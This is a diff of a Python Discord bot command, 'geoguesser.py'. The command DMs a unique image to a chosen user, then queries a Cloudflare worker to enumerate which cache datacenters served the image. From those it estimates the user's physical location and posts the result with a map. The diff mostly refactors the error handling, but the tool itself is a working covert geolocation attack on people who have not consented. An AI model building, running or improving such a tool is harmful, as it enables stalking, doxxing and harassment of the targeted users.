@@ -1,4 +1,8 @@
 """
+
+made by zaneok dont larp
+
+
 geoguesser.py – !geoguesser <@user>
 Generates a unique random image, sends it to a target user,
 then uses Cloudflare cache enumeration to estimate their location.
@@ -13,6 +17,7 @@ import discord
 from PIL import Image, ImageDraw
 from datetime import datetime
 import math
+import traceback
 
 # ============ CONFIGURATION ============
 WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
@@ -73,20 +78,8 @@ def haversine(lat1, lon1, lat2, lon2):
     a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
     return R * 2 * math.asin(math.sqrt(a))
 
-async def safe_edit(channel, msg, content):
-    """
-    Try to edit a message. If it was deleted, send a new one instead.
-    Returns the new/current message object so we always have a valid reference.
-    (Does NOT support embed – we only use plain content for status messages.)
-    """
-    try:
-        await msg.edit(content=content)
-        return msg
-    except discord.NotFound:
-        return await channel.send(content)
-
 async def run(client, message, args):
-    # ====== Input validation ======
+    # Input validation
     if not args.strip():
         await message.channel.send("Usage: `!geoguesser <@user or user_id>`")
         return
@@ -110,90 +103,74 @@ async def run(client, message, args):
         # Generate image
         img_bytes = generate_random_image()
 
-        # Upload to channel to get the CDN URL
-        status_msg = await safe_edit(
-            message.channel, status_msg, "📤 Uploading to Discord CDN..."
-        )
+        # Update status (handle possible deletion)
+        try:
+            await status_msg.edit(content="📤 Uploading to Discord CDN...")
+        except discord.NotFound:
+            status_msg = await message.channel.send("📤 Uploading to Discord CDN...")
+
+        # Upload to channel to get CDN URL
         try:
             sent = await message.channel.send(
                 file=discord.File(img_bytes, filename="geo.png")
             )
             if not sent.attachments:
-                await safe_edit(
-                    message.channel, status_msg, "❌ No attachment URL returned."
-                )
+                await message.channel.send("❌ No attachment URL returned.")
                 return
             image_url = sent.attachments[0].url
 
-            # Delete the temporary upload message safely
+            # Delete temporary upload message (don't crash if already gone)
             try:
                 await sent.delete()
             except discord.NotFound:
-                pass  # Already deleted by another bot – fine
+                pass
         except Exception as e:
-            await safe_edit(
-                message.channel, status_msg, f"❌ Failed to upload image: {e}"
-            )
+            await message.channel.send(f"❌ Failed to upload image: {e}")
             return
 
         # DM the image to the target
-        status_msg = await safe_edit(
-            message.channel,
-            status_msg,
-            f"📨 Sending image to {target.name}..."
-        )
+        try:
+            await status_msg.edit(content=f"📨 Sending image to {target.name}...")
+        except discord.NotFound:
+            status_msg = await message.channel.send(f"📨 Sending image to {target.name}...")
+
         img_bytes.seek(0)
         try:
             await target.send(file=discord.File(img_bytes, filename="geo.png"))
         except discord.Forbidden:
-            await safe_edit(
-                message.channel, status_msg,
-                "❌ Cannot DM that user (DMs closed)."
-            )
+            await message.channel.send("❌ Cannot DM that user (DMs closed).")
             return
         except Exception as e:
-            await safe_edit(
-                message.channel, status_msg, f"❌ DM failed: {e}"
-            )
+            await message.channel.send(f"❌ DM failed: {e}")
             return
 
         # Wait for cache propagation
-        status_msg = await safe_edit(
-            message.channel,
-            status_msg,
-            "⏳ Waiting 12 seconds for cache & notifications..."
-        )
+        try:
+            await status_msg.edit(content="⏳ Waiting 12 seconds for cache & notifications...")
+        except discord.NotFound:
+            status_msg = await message.channel.send("⏳ Waiting 12 seconds for cache & notifications...")
         await asyncio.sleep(12)
 
         # Enumerate Cloudflare cache
-        status_msg = await safe_edit(
-            message.channel,
-            status_msg,
-            "🔍 Enumerating Cloudflare cache locations..."
-        )
+        try:
+            await status_msg.edit(content="🔍 Enumerating Cloudflare cache locations...")
+        except discord.NotFound:
+            status_msg = await message.channel.send("🔍 Enumerating Cloudflare cache locations...")
+
         api_url = f"{WORKER_URL}?url={image_url}"
 
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(api_url, timeout=35) as resp:
                     if resp.status != 200:
-                        await safe_edit(
-                            message.channel, status_msg,
-                            f"❌ Worker error (HTTP {resp.status})"
-                        )
+                        await message.channel.send(f"❌ Worker error (HTTP {resp.status})")
                         return
                     data = await resp.json()
         except asyncio.TimeoutError:
-            await safe_edit(
-                message.channel, status_msg,
-                "⏰ Worker timed out – try again later."
-            )
+            await message.channel.send("⏰ Worker timed out – try again later.")
             return
         except Exception as e:
-            await safe_edit(
-                message.channel, status_msg,
-                f"⚠️ Worker request failed: {e}"
-            )
+            await message.channel.send(f"⚠️ Worker request failed: {e}")
             return
 
         # Process worker response
@@ -202,11 +179,7 @@ async def run(client, message, args):
         checked = data.get('checked', 0)
 
         if not datacenters:
-            await safe_edit(
-                message.channel,
-                status_msg,
-                "❌ No cache hits. Target may not have downloaded the image. Try again later."
-            )
+            await message.channel.send("❌ No cache hits. Target may not have downloaded the image. Try again later.")
             return
 
         coords = []
@@ -219,11 +192,7 @@ async def run(client, message, args):
                 colo_names.append(colo)
 
         if not coords:
-            await safe_edit(
-                message.channel,
-                status_msg,
-                f"Found datacenters: {', '.join(datacenters)} – but no coordinates available."
-            )
+            await message.channel.send(f"Found datacenters: {', '.join(datacenters)} – but no coordinates available.")
             return
 
         # Compute estimation
@@ -263,20 +232,20 @@ async def run(client, message, args):
         embed.set_footer(text="Powered by Cloudflare Cache Enumeration")
         embed.set_image(url=map_url)
 
-        # Clean up the status message and post the final result
+        # Delete status message (safe)
         try:
             await status_msg.delete()
         except discord.NotFound:
             pass
 
+        # Send final result
         await message.channel.send(embed=embed)
 
     except Exception as e:
-        # Final safety net – log and inform the user
+        # Print full traceback to console so you can see exactly what went wrong
+        traceback.print_exc()
         error_msg = f"⚠️ Unexpected error: {e}"
         try:
             await message.channel.send(error_msg)
         except:
             pass
-        # Reraise if you want full traceback in the bot console
-        raise
